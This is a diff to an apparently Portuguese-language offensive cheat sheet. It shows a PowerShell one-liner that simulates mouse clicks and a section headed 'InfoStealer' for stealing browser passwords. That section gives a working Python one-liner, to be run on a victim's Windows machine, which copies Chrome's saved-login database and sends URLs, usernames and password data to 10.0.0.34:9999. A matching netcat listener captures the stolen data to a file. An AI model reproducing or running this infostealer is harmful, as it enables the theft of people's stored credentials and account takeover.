@@ -251,11 +251,12 @@ powershell -command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Win
 powershell -command "Add-Type -AssemblyName System.Windows.Forms; $code='using System; using System.Runtime.InteropServices; public class MouseClick { [DllImport(\"user32.dll\")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo); }'; Add-Type $code; [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(499,491); Start-Sleep -Milliseconds 100; [MouseClick]::mouse_event(2,0,0,0,[UIntPtr]::Zero); [MouseClick]::mouse_event(4,0,0,0,[UIntPtr]::Zero)"
 ```
 
-### InfoStealer - Roubar senhas
+### 6. InfoStealer - Roubar senhas do Navegador
 ```cmd
+# No shell da vitima windows:
 python -c "import os, sqlite3, shutil, tempfile, socket; login_data = os.environ['LOCALAPPDATA'] + r'\Google\Chrome\User Data\Default\Login Data'; temp_db = tempfile.mktemp(suffix='.db'); shutil.copy2(login_data, temp_db); conn = sqlite3.connect(temp_db); cursor = conn.cursor(); cursor.execute('SELECT origin_url, username_value, password_value FROM logins'); result = ''; [result := result + f'URL: {url}\nUser: {user}\nPass: {pwd.hex()}\n\n' for url, user, pwd in cursor.fetchall()]; conn.close(); os.unlink(temp_db); s = socket.socket(); s.settimeout(5); s.connect(('10.0.0.34', 9999)); s.send(result.encode() if result else b'NO_PASSWORDS_FOUND'); s.close(); print('Enviado:', len(result), 'bytes')"
-```
-**Inicie o listernet no linux**
-```cmd
+
+# No shell do atacante
 nc -lvnp 9999 > chrome_passwords.txt
 ```
+---
